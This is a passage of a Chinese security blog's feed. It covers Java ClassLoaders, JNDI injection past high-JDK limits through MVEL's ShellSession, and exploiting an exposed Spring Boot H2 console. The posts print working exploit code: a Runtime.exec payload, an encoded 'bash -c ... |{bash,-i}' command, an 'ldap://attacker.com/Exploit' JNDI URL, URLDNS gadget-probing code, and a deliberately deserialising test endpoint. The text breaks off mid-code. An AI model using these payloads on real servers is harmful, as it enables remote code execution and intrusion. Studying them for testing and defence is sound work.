&lt;h4 id=&quot;BootstrapClassLoader&quot;&gt;&lt;a href=&quot;#BootstrapClassLoader&quot; class=&quot;headerlink&quot; title=&quot;BootstrapClassLoader&quot;&gt;&lt;/a&gt;BootstrapClassLoader&lt;/h4&gt;&lt;p&gt;JVM内置的默认&lt;code&gt;classLoader&lt;/code&gt;,负责加载JVM运行时的核心类，位于&lt;code&gt;JAVA_HOME/lib/rt.jar/&lt;/code&gt;文件夹中，由C代码实现，&lt;code&gt;Bootstrap ClassLoader&lt;/code&gt;类加载器所加载的类的ClassLoader时候都会返回null&lt;/p&gt;
&lt;h4 id=&quot;ExtClassLoader&quot;&gt;&lt;a href=&quot;#ExtClassLoader&quot; class=&quot;headerlink&quot; title=&quot;ExtClassLoader&quot;&gt;&lt;/a&gt;ExtClassLoader&lt;/h4&gt;&lt;p&gt;扩展类加载器，负责加载 JVM 扩展类，扩展 jar 包位于 &lt;code&gt;JAVA_HOME/lib/ext/*.jar&lt;/code&gt; 中，库名通常以 javax 开头&lt;/p&gt;
&lt;h4 id=&quot;AppClassLoader&quot;&gt;&lt;a href=&quot;#AppClassLoader&quot; class=&quot;headerlink&quot; title=&quot;AppClassLoader&quot;&gt;&lt;/a&gt;AppClassLoader&lt;/h4&gt;&lt;p&gt;应用类加载器/系统类加载器，直接提供给用户使用的ClassLoader，它会加载&lt;code&gt;ClASSPATH&lt;/code&gt;环境变量或者&lt;code&gt;java.class.path&lt;/code&gt;属性里定义的路径中的jar包和目录，我们自己编写和使用的第三方Jar包通常都是由它来加载&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>JNDI Bypass - MVEL</title>
    <link href="https://jkme.github.io/2022/03/21/jndi-exec-by-mvel.html"/>
    <id>https://jkme.github.io/2022/03/21/jndi-exec-by-mvel.html</id>
    <published>2022-03-20T16:00:00.000Z</published>
    <updated>2022-03-21T06:53:39.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="测试背景"><a href="#测试背景" class="headerlink" title="测试背景"></a>测试背景</h2><p>JDNI利用mvel绕过高版本java限制的时候，使用<a href="https://ares-x.com/tools/runtime-exec/">runtime exec</a>编码变形之后执行命令失败。只能弹个计算器。<br><img src="/2022/03/21/jndi-exec-by-mvel/1.png"></p><h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>浅蓝师傅在<a href="https://tttang.com/archive/1405/">探索高版本JDK下JNDI 漏洞的利用方法</a>中给出的执行方式:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>            <span class="token string">"push Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ref<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先说结论：把执行命令的时候<code>push</code>指令去掉，可以成功执行命令。</p><h2 id="原因探索"><a href="#原因探索" class="headerlink" title="原因探索"></a>原因探索</h2><p>先把测试的命令做一次编码:<code>open /System/Applications/Calculator.app/Contents/MacOS/Calculator</code><br>经过编码之后： <code>bash -c &#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p><h3 id="存在push的时候"><a href="#存在push的时候" class="headerlink" title="存在push的时候"></a>存在push的时候</h3><p>经过一路的跳转，进入到<code>_exec()</code>函数，调用堆栈如下:</p><pre class="line-numbers language-none"><code class="language-none">_exec:122, ShellSession (org.mvel2.sh)exec:463, ShellSession (org.mvel2.sh)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)getObjectInstance:211, BeanFactory (org.apache.naming.factory)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:9, RMITest (com.rmi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数在108行对传入的字符串进行分割: <code>String[] inTokens = this.inBuffer.append(this.commandBuffer).toString().split(&quot;\\s&quot;);</code>， <code>\s</code>表示空格、tab、换行: <code>&#39; &#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\r&#39;</code>等<br><img src="/2022/03/21/jndi-exec-by-mvel/2.png"><br>分割之后，得到<code>inTokens</code>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">inTokens <span class="token operator">=</span> <span class="token punctuation">&#123;</span>String<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>@1355<span class="token punctuation">&#125;</span>  <span class="token number">0</span> <span class="token operator">=</span> <span class="token string">"push"</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token string">"Runtime.getRuntime().exec('bash"</span> <span class="token number">2</span> <span class="token operator">=</span> <span class="token string">"-c"</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token string">"&#123;echo,L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后获取<code>inTokens[1:]</code>赋值给<code>passParamters</code>。继续跟进到119行代码: <code>((Command)this.commands.get(inTokens[0])).execute(this, passParameters);</code>，进入调用push指令的函数，此时的参数如下：<br><img src="/2022/03/21/jndi-exec-by-mvel/3.png"><br>在<code>pushContext.java</code>里面调用<code>MVEL.eval</code>解析MVEL表达式，这个时候可以看出来执行<code>MVEL.eval</code>的时候，第一个参数是args[0]: <code>Runtime.getRuntime().exec(&#39;bash</code>，所以会导致命令执行失败:<br><img src="/2022/03/21/jndi-exec-by-mvel/4.png"></p><h3 id="去掉push的时候"><a href="#去掉push的时候" class="headerlink" title="去掉push的时候"></a>去掉push的时候</h3><p>当没有push的时候，执行到<code>SHellSession.java</code>会跳转到123行代码分支，然后实例化<code>MVELInterpretedRuntime</code>之后调用<code>parse()</code>函数:<br><img src="/2022/03/21/jndi-exec-by-mvel/5.png"><br>经过一系列解析判断之后最终进入到<code>propertyAccessor.class</code>的896行，获取到<code>Runtime</code>上下文之后调用传入的参数:<br><img src="/2022/03/21/jndi-exec-by-mvel/6.png"><br>函数调用堆栈:</p><pre class="line-numbers language-none"><code class="language-none">getMethod:995, PropertyAccessor (org.mvel2)getNormal:181, PropertyAccessor (org.mvel2)get:145, PropertyAccessor (org.mvel2)get:125, PropertyAccessor (org.mvel2)getReducedValue:187, ASTNode (org.mvel2.ast)parseAndExecuteInterpreted:112, MVELInterpretedRuntime (org.mvel2)parse:58, MVELInterpretedRuntime (org.mvel2)_exec:171, ShellSession (org.mvel2.sh)exec:463, ShellSession (org.mvel2.sh)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)getObjectInstance:211, BeanFactory (org.apache.naming.factory)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:9, RMITest (com.rmi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://tttang.com/archive/1405/">探索高版本JDK下JNDI漏洞的利用方法</a></li><li><a href="https://ares-x.com/tools/runtime-exec/">RUNTIME.EXEC PAYLOAD ENCODE</a></li><li><a href="https://github.com/JKme/EvilRMI">EvilRMI</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;测试背景&quot;&gt;&lt;a href=&quot;#测试背景&quot; class=&quot;headerlink&quot; title=&quot;测试背景&quot;&gt;&lt;/a&gt;测试背景&lt;/h2&gt;&lt;p&gt;JDNI利用mvel绕过高版本java限制的时候，使用&lt;a href=&quot;https://ares-x.com/tools/runtime-exec/&quot;&gt;runtime exec&lt;/a&gt;编码变形之后执行命令失败。只能弹个计算器。&lt;br&gt;&lt;img src=&quot;/2022/03/21/jndi-exec-by-mvel/1.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;测试结果&quot;&gt;&lt;a href=&quot;#测试结果&quot; class=&quot;headerlink&quot; title=&quot;测试结果&quot;&gt;&lt;/a&gt;测试结果&lt;/h2&gt;&lt;p&gt;浅蓝师傅在&lt;a href=&quot;https://tttang.com/archive/1405/&quot;&gt;探索高版本JDK下JNDI 漏洞的利用方法&lt;/a&gt;中给出的执行方式:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;tomcat_MVEL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt; ref &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ResourceRef&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;org.mvel2.sh.ShellSession&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;org.apache.naming.factory.BeanFactory&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    ref&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;StringRefAddr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;forceString&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;a=exec&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    ref&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;StringRefAddr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;token string&quot;&gt;&quot;push Runtime.getRuntime().exec(&#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; ref&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;先说结论：把执行命令的时候&lt;code&gt;push&lt;/code&gt;指令去掉，可以成功执行命令。&lt;/p&gt;
&lt;h2 id=&quot;原因探索&quot;&gt;&lt;a href=&quot;#原因探索&quot; class=&quot;headerlink&quot; title=&quot;原因探索&quot;&gt;&lt;/a&gt;原因探索&lt;/h2&gt;&lt;p&gt;先把测试的命令做一次编码:&lt;code&gt;open /System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/code&gt;&lt;br&gt;经过编码之后： &lt;code&gt;bash -c &amp;#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;存在push的时候&quot;&gt;&lt;a href=&quot;#存在push的时候&quot; class=&quot;headerlink&quot; title=&quot;存在push的时候&quot;&gt;&lt;/a&gt;存在push的时候&lt;/h3&gt;&lt;p&gt;经过一路的跳转，进入到&lt;code&gt;_exec()&lt;/code&gt;函数，调用堆栈如下:&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>从Spring Boot H2 Database到GetShell</title>
    <link href="https://jkme.github.io/2022/03/18/from-spring-boot-to-getshell.html"/>
    <id>https://jkme.github.io/2022/03/18/from-spring-boot-to-getshell.html</id>
    <published>2022-03-17T16:00:00.000Z</published>
    <updated>2023-02-15T05:50:06.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-切入点"><a href="#0x1-切入点" class="headerlink" title="0x1. 切入点"></a>0x1. 切入点</h2><p>在日常测试的时候，使用ffuf发现一个<code>/console</code>的接口，打开之后发现是H2 Database页面：<br><img src="/2022/03/18/from-spring-boot-to-getshell/1.png"><br>如果Spring Boot项目中包含h2database并且在配置文件中启用h2-console，则存在<a href="https://anquan.baidu.com/article/1078">JNDI注入漏洞</a>.</p><p>设置<code>Driver Class</code>为<code>javax.naming.InitialContext</code>，<code>JDBC URL</code>为<code>ldap://attacker.com/Exploit</code>：<br><img src="/2022/03/18/from-spring-boot-to-getshell/2.png"><br>根据<code>/env</code>泄漏的信息，得知Java版本是1.8.0_312，高版本JDK中由于默认codebase为true从而导致客户端默认不会请求远程Server上的恶意 Class, 因此不可以直接使用LDAP加载远程恶意代码。</p><blockquote><p>RMI：JDK 8u113、JDK 7u122、JDK 6u132 起 codebase 默认为 true<br>LDAP：JDK 11.0.1、JDK 8u191、JDK 7u201、JDK 6u211 起 codebase 默认为 true</p></blockquote><h2 id="0x2-绕过和利用"><a href="#0x2-绕过和利用" class="headerlink" title="0x2. 绕过和利用"></a>0x2. 绕过和利用</h2><h3 id="利用本地Class作为Reference-Factory绕过"><a href="#利用本地Class作为Reference-Factory绕过" class="headerlink" title="利用本地Class作为Reference Factory绕过"></a>利用本地Class作为Reference Factory绕过</h3><p>利用URLDNS链可以探测Java黑盒应用里面某个类是否存在, 在珂字辈和c0ny1师傅的两篇文章讲的很详细：</p><ul><li><a href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldns链探测类工具发放</a></li><li><a href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">构造java探测class反序列化gadget</a></li><li><a href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">老链新用，利用URLDNS链探测gadget</a></li></ul><p>URLDNS的测试代码，生成一个序列化的数据包<code>1.ser</code>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Urldns</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://333.f9575af1.dns.1433.eu.org"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);</span>          hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.beanutils.BeanComparator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));</span>        <span class="token comment">//ois.readObject();</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> clazzName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span>clazzName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为动态生成的类也可以被反序列化，因此上面代码生成的序列化数据，最好在另外一个环境里面反序列化测试。<br>post请求提交上面生成的<code>1.ser</code>到<code>/yso</code>接口，如果生成<code>1.ser</code>里面的类在反序列化的时候存在，则会收到dnslog请求：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">ThreadContext</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">.</span></span><span class="token class-name">UpperLookup</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestClass</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/yso"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">URLDemo</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ServletInputStream</span> inputStream <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">TestClass</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/log"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestHeader</span><span class="token punctuation">(</span><span class="token string">"X-Api-Version"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> apiVersion<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ThreadContext</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"apiVersion"</span><span class="token punctuation">,</span> apiVersion<span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Received a request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">UpperLookup</span> upperLookup <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpperLookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token 